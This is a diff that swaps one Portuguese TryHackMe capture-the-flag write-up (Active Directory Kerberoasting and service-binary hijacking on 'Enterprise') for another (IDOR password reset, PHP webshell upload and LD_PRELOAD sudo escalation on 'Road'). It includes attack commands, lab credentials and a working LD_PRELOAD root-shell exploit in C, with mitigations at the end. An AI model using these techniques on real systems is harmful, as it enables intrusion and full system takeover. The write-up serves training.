@@ -1,453 +1,359 @@
-# 📄 RELATÓRIO TÉCNICO – CTF ENTERPRISE (TryHackMe)
+# 📄 RELATÓRIO TÉCNICO – CTF ROAD (TryHackMe)
 
 👤 **Autor:** c0rt3s
 🎯 **Plataforma:** TryHackMe
-🖥️ **Máquina:** Enterprise
-📌 **Tipo:** CTF – Active Directory / Windows / Privilege Escalation
-⚙️ **Objetivo:** Comprometer o domínio e obter as flags do sistema
-📊 **Nível de dificuldade:** Difícil
-🧠 **Base de estudo:** Conteúdo e metodologia do curso da Desec Security
+🖥️ **Máquina:** Road
+📌 **Tipo:** CTF – Web / Linux / Privilege Escalation
+⚙️ **Objetivo:** Comprometer a aplicação web e obter acesso root no sistema
+📊 **Nível de dificuldade:** Médio
+🧠 **Base de estudo:** Metodologia DUNGEON + Desec Security
 
 ---
 
 # 🎯 Objetivo do Lab
 
-O objetivo deste laboratório foi comprometer a máquina **Enterprise** da plataforma TryHackMe explorando falhas de segurança em um ambiente **Active Directory baseado em Windows Server 2019**.
+O objetivo deste laboratório foi comprometer a máquina **Road**, explorando vulnerabilidades em uma aplicação web hospedada em um servidor Linux.
 
-Durante o processo foram utilizadas técnicas de:
+Durante a exploração foram utilizadas técnicas de:
 
-* Reconhecimento de serviços
-* Enumeração de domínio
-* Extração de credenciais
-* Ataques Kerberos (Kerberoasting)
-* Movimentação lateral
-* Enumeração de privilégios
-* Escalonamento de privilégios via serviço vulnerável
+* Enumeração de serviços
+* Descoberta de diretórios web
+* Exploração de falha lógica (IDOR)
+* Upload de arquivo malicioso (webshell)
+* Execução remota de comandos (RCE)
+* Extração de credenciais via banco de dados
+* Escalonamento de privilégios via variável de ambiente (**LD_PRELOAD**)
 
-A exploração culminou na obtenção de acesso **administrativo ao domínio**, permitindo a captura das flags presentes no sistema.
+A exploração resultou em acesso **root completo ao sistema**.
 
 ---
 
 # ⚔️ Resumo da Cadeia de Ataque
 
-A exploração seguiu o seguinte fluxo:
-
 ```
 Nmap Scan
       ↓
-Enumeração SMB
+Enumeração Web (Gobuster)
       ↓
-Investigação de repositório GitHub
+Descoberta /v2/admin
       ↓
-Credencial exposta (nik)
+Registro de usuário
       ↓
-Enumeração RPC
+Descoberta do email admin
       ↓
-Descoberta de usuário temporário
+Exploração IDOR (reset de senha)
       ↓
-Kerberoasting
+Acesso como admin
       ↓
-Crack de hash Kerberos
+Upload de webshell
       ↓
-Credencial bitbucket
+Shell reversa (www-data)
       ↓
-Acesso RDP
+Extração de credenciais via MongoDB
       ↓
-Enumeração local
+Acesso SSH (webdeveloper)
       ↓
-Identificação do serviço ZeroTier
+Sudo mal configurado (LD_PRELOAD)
       ↓
-Service Hijacking
-      ↓
-Reverse Shell como SYSTEM
-      ↓
-Acesso Administrator
+Escalonamento para root
       ↓
 Captura das flags
 ```
 
-Esse fluxo representa uma **cadeia clássica de ataque em ambientes Active Directory com múltiplas credenciais expostas e escalonamento via serviços mal configurados**.
+Essa cadeia representa um **ataque clássico em aplicações web com falhas de lógica + má configuração de privilégios no sistema operacional**.
 
 ---
 
 # 🔍 Reconhecimento Inicial – Nmap
 
-O primeiro passo foi identificar os serviços disponíveis na máquina alvo.
+O primeiro passo foi identificar serviços expostos na máquina alvo.
 
 ```
-nmap -sC -sV -Pn enterprise.thm
+nmap -sC -sV -Pn -n -p- road.thm
 ```
 
 Portas identificadas:
 
 ```
-53
-80
-88
-135
-139
-389
-445
-464
-593
-636
-3268
-3269
-3389
-5985
-7990
-9389
-47001
-49664-49709
-```
-
-Essas portas indicam claramente um **ambiente Active Directory**, incluindo serviços como:
-
-* LDAP
-* Kerberos
-* SMB
-* WinRM
-* RDP
-
----
-
-# 🏢 Identificação do Domínio
-
-Durante a enumeração foi identificado o domínio:
-
-```
-LAB.ENTERPRISE.THM
-```
-
-Hostname do controlador de domínio:
-
-```
-LAB-DC.LAB.ENTERPRISE.THM
+22/tcp  - SSH (OpenSSH 8.2p1 Ubuntu)
+80/tcp  - HTTP (Apache 2.4.41)
 ```
 
 Sistema operacional identificado:
 
 ```
-Windows Server 2019
+Linux (Ubuntu)
 ```
 
 ---
 
-# 📂 Enumeração SMB
+# 🌐 Enumeração Web
 
-A enumeração SMB revelou diversos compartilhamentos disponíveis.
-
-```
-smbclient -L //enterprise.thm
-```
-
-Compartilhamentos encontrados:
+Foi realizada enumeração de diretórios utilizando Gobuster.
 
 ```
-Docs
-Users
-SYSVOL
-NETLOGON
+gobuster dir -u http://road.thm/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
----
-
-# 📄 Arquivos Encontrados
-
-Durante a exploração dos compartilhamentos foram encontrados alguns arquivos relevantes.
-
-### Diretório Docs
-
-Arquivos identificados:
+Diretórios encontrados:
 
 ```
-RSA-Secured-Credentials.xlsx
-RSA-Secured-Document-PII.docx
+/assets
+/phpMyAdmin
+/v2
 ```
 
-Ambos estavam protegidos por criptografia.
-
----
-
-### Diretório Users
-
-Foram encontrados diretórios de diversos usuários:
+Enumeração adicional no diretório administrativo:
 
 ```
-LAB-ADMIN
-atlbitbucket
-bitbucket
-Administrator
+/v2/admin/
 ```
 
-Dentro do diretório **LAB-ADMIN** foi identificado um arquivo interessante:
+Arquivos relevantes:
 
 ```
-AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
-```
-
-Esse arquivo indica armazenamento de **credenciais do Windows Credential Manager**.
-
----
-
-# 🌐 Investigação do Serviço Web – Porta 7990
-
-Na porta **7990** foi encontrado um serviço web relacionado à Atlassian.
-
-A página apresentava uma mensagem:
-
-```
-"We are moving to Github!"
-```
-
-Isso indicava que o código do projeto havia sido migrado para um repositório GitHub.
-
----
-
-# 🔎 Investigação no GitHub
-
-Durante a investigação foi encontrada a organização:
-
-```
-Enterprise-THM
-```
-
-Um colaborador relevante foi identificado:
-
-```
-Nik-enterprise-dev
-```
-
-Em um dos repositórios foi encontrado um **script PowerShell relacionado à automação de Active Directory**.
-
-Ao analisar o histórico de commits foi possível identificar uma credencial exposta.
-
----
-
-# 🔑 Credencial Exposta em Commit
-
-Um commit antigo revelou as seguintes credenciais hardcoded:
-
-```
-Usuário: nik
-Senha: ToastyBoi!
+login.html
+register.html
+ResetUser.php
+lostpassword.php
+profile.php
+track_orders.php
 ```
 
 ---
 
-# ✔️ Validação da Credencial
+# 🧠 Análise da Aplicação
 
-A credencial foi validada utilizando **CrackMapExec**.
+A aplicação identificada (**Sky Couriers**) possui:
+
+* Sistema de login e registro
+* Painel administrativo completo
+* Funcionalidade de reset de senha
+* Upload de arquivos de perfil
+* Consulta de pedidos via parâmetro GET
+
+Pontos de interesse identificados:
+
+* `lostpassword.php` → potencial falha lógica
+* `ResetUser.php` → manipulação de usuários
+* `profile.php` → upload de arquivos
+* `track_orders.php` → possível vetor de entrada (GET)
+
+---
+
+# 🧨 Exploração – IDOR (Reset de Senha)
+
+Foi identificada uma vulnerabilidade de **IDOR (Insecure Direct Object Reference)** no mecanismo de reset de senha.
+
+### Comportamento vulnerável:
+
+O sistema permite alterar a senha de qualquer usuário apenas modificando o parâmetro:
 
 ```
-crackmapexec smb enterprise.thm -u nik -p 'ToastyBoi!'
+uname
+```
+
+### Exploração:
+
+1. Criar conta válida
+2. Autenticar na aplicação
+3. Interceptar requisição no Burp Suite
+4. Alterar:
+
+```
+uname=admin@sky.thm
+```
+
+5. Definir nova senha
+6. Realizar login como administrador
+
+---
+
+# 🔓 Acesso Administrativo
+
+Após exploração da vulnerabilidade, foi obtido acesso ao painel administrativo com:
+
+```
+admin@sky.thm
+```
+
+Isso permitiu acesso a funcionalidades críticas, incluindo upload de arquivos.
+
+---
+
+# 💻 Upload de Webshell
+
+A funcionalidade de upload em `profile.php` permitiu envio de arquivo PHP malicioso.
+
+Arquivo enviado:
+
+```
+php-reverse-shell.php
+```
+
+Local de armazenamento:
+
+```
+/v2/profileimages/
+```
+
+Execução do payload:
+
+```
+http://road.thm/v2/profileimages/php-reverse-shell.php
+```
+
+Listener:
+
+```
+nc -nvlp 4444
 ```
 
 Resultado:
 
 ```
-[+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
-```
-
-Isso confirmou que a credencial era válida no domínio.
-
----
-
-# 📡 Enumeração RPC
-
-Utilizando a credencial encontrada foi realizada enumeração via **RPC**.
-
-```
-rpcclient -U nik enterprise.thm
-```
-
-Durante a enumeração foi identificado um usuário adicional:
-
-```
-contractor-temp
-```
-
-Credencial associada:
-
-```
-Change password from Password123!
+Shell obtida como www-data
 ```
 
 ---
 
-# 🔥 Kerberoasting
-
-Com o usuário **contractor-temp**, foi possível realizar um ataque **Kerberoasting** utilizando ferramentas do **Impacket**.
+# 🔧 Estabilização da Shell
 
 ```
-impacket-GetUserSPNs LAB.ENTERPRISE.THM/contractor-temp:Password123! -dc-ip enterprise.thm -request
-```
-
-Esse comando permitiu obter um **hash Kerberos do tipo TGS**.
-
----
-
-# 🔓 Crack da Hash Kerberos
-
-A hash obtida foi quebrada utilizando **Hashcat**, revelando uma nova credencial:
-
-```
-Usuário: bitbucket
-Senha: littleredbucket
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo
+export TERM=xterm
 ```
 
 ---
 
-# 🖥️ Acesso via RDP
+# 🔐 Extração de Credenciais
 
-Com essa credencial foi possível acessar a máquina através de **Remote Desktop Protocol**.
-
-```
-xfreerdp3 /u:bitbucket /p:littleredbucket /v:enterprise.thm
-```
-
-Após o login foi possível explorar o sistema.
-
----
-
-# 🚩 Captura da Primeira Flag
-
-Logo após o acesso inicial foi encontrada a primeira flag:
+Durante a exploração do sistema, foi identificado acesso ao **MongoDB**, contendo credenciais em texto plano:
 
 ```
-user.txt
+webdeveloper : BahamasChapp123!@#
 ```
 
 ---
 
-# 🔎 Enumeração Local
+# 🖥️ Acesso via SSH
 
-Inicialmente foi tentado realizar enumeração de privilégios utilizando **BloodHound**, porém o processo não trouxe resultados úteis para exploração.
-
-Durante a análise manual do sistema foi identificado um serviço instalado:
+Com as credenciais obtidas:
 
 ```
-ZeroTier
+ssh webdeveloper@road.thm
 ```
 
-Localizado em:
-
-```
-C:\Program Files (x86)\Zero Tier\Zero Tier One
-```
-
-Esse serviço posteriormente se mostrou vulnerável a **hijacking de executável**.
+Foi possível obter acesso a um usuário com mais privilégios.
 
 ---
 
-# 🧨 Preparação do Payload
+# 🚀 Escalonamento de Privilégios
 
-Foi criado um payload utilizando **msfvenom**.
+## 🔎 Análise de Sudo
 
-Nome do payload:
-
-```
-ZeroTierOneService.exe
-```
-
-Esse payload era responsável por abrir uma **reverse shell** para a máquina atacante.
-
----
-
-# 🌐 Servidor HTTP na Máquina Atacante
-
-Na máquina atacante foi iniciado um servidor HTTP simples.
+Foi identificado um binário executável com permissões elevadas:
 
 ```
-python3 -m http.server
+/usr/bin/sky_backup_utility
+```
+
+Configuração vulnerável:
+
+```
+NOPASSWD + env_keep+=LD_PRELOAD
 ```
 
 ---
 
-# 📥 Download do Payload na Máquina Alvo
+## 🧨 Exploração com LD_PRELOAD
 
-Na máquina Windows comprometida foi realizado o download do payload.
+Foi criado um payload em C para execução com privilégios elevados.
 
-O arquivo foi salvo no diretório do serviço **ZeroTier**.
+### Código:
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void exploit() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+```
+
+### Compilação:
 
 ```
-C:\Program Files (x86)\Zero Tier\Zero Tier One
+gcc -fPIC -shared -o exploit.so exploit.c
 ```
 
-Posteriormente o executável original do serviço foi substituído pelo payload.
+### Execução:
+
+```
+sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/sky_backup_utility
+```
+
+Resultado:
+
+```
+Shell root obtida
+```
 
 ---
 
-# 🎧 Listener na Máquina Atacante
-
-Antes de reiniciar o serviço foi iniciado um listener para receber a conexão reversa.
+# 🚩 Captura das Flags
 
 ```
-nc -nlvp 4444
-```
-
----
-
-# 🚀 Escalonamento de Privilégio
-
-Após substituir o executável do serviço **ZeroTier**, o serviço foi reiniciado.
-
-Como o serviço era executado com privilégios elevados, o payload foi executado com **privilégios SYSTEM**.
-
-Isso resultou na abertura de uma **reverse shell com privilégios administrativos**.
-
----
-
-# 🔓 Acesso ao Administrator
-
-Com acesso privilegiado foi possível acessar o diretório do administrador.
-
-```
-C:\Users\Administrator\Desktop
-```
-
-Nesse diretório foi encontrada a flag final:
-
-```
-root.txt
+/home/webdeveloper/user.txt
+/root/root.txt
 ```
 
 ---
 
 # 💥 Impacto de Segurança
 
-Se esse cenário estivesse presente em um ambiente corporativo real, um atacante poderia:
+Em um ambiente real, essa cadeia permitiria:
 
-* comprometer múltiplas contas do domínio
-* realizar movimentação lateral na rede
-* obter execução remota em servidores críticos
-* escalar privilégios até administrador do sistema
-* comprometer totalmente o domínio Active Directory
+* Comprometimento completo da aplicação web
+* Acesso administrativo indevido
+* Execução remota de código
+* Vazamento de credenciais sensíveis
+* Escalonamento total para root
+* Controle completo do servidor
 
 ---
 
 # 🛡️ Mitigações Recomendadas
 
-Algumas medidas que poderiam prevenir esse tipo de ataque incluem:
-
-* evitar exposição de credenciais em repositórios Git
-* implementar rotação periódica de senhas
-* restringir acesso a compartilhamentos SMB
-* monitorar ataques Kerberoasting
-* revisar permissões de serviços executados como SYSTEM
-* implementar monitoramento de eventos do Active Directory
+* Implementar controle de autorização no reset de senha (evitar IDOR)
+* Validar uploads no servidor (extensão, MIME, conteúdo)
+* Bloquear execução de scripts em diretórios de upload
+* Remover `LD_PRELOAD` do sudo
+* Utilizar caminhos absolutos em binários
+* Criptografar credenciais no banco de dados
+* Implementar princípio de menor privilégio
 
 ---
 
 # 🧠 Conclusão
 
-Este laboratório demonstrou diversas falhas comuns em ambientes Active Directory:
+Este laboratório demonstrou uma cadeia de ataque bem estruturada envolvendo:
 
-* credenciais expostas em repositórios
-* contas temporárias mal gerenciadas
-* vulnerabilidade a Kerberoasting
-* serviços mal configurados permitindo escalonamento de privilégios
+* Falha de lógica crítica (**IDOR**)
+* Upload arbitrário de arquivos
+* Execução remota de comandos
+* Exposição de credenciais em banco de dados
+* Má configuração de privilégios no sistema Linux
 
-A exploração bem-sucedida reforça a importância de uma metodologia estruturada de pentest e demonstra na prática a aplicação das técnicas estudadas durante o treinamento da **Desec Security**.
+A exploração reforça a importância de:
 
----
+* validação adequada de acesso
+* controle de uploads
+* hardening do sistema operacional
+
+Além disso, evidencia como **falhas simples, quando encadeadas, levam a comprometimento total do sistema** — exatamente o tipo de cenário explorado em testes de intrusão reais.
